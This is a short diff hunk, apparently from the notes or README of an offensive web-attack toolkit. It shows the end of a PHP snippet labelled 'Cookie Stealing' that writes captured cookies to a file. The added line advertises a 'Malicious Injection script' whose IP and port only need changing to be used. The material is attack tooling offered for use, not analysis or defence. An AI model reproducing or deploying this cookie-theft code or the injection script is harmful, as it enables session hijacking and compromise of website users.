@@ -83,6 +83,7 @@ Cookie Stealing (This will break the website): <?php
                                                fwrite($steal, $cookie ."\n");
                                                fclose($steal);
                                                ?>
+                                               Malicious Injection script is in the spaghetti, just change the ip and port
 
 
 
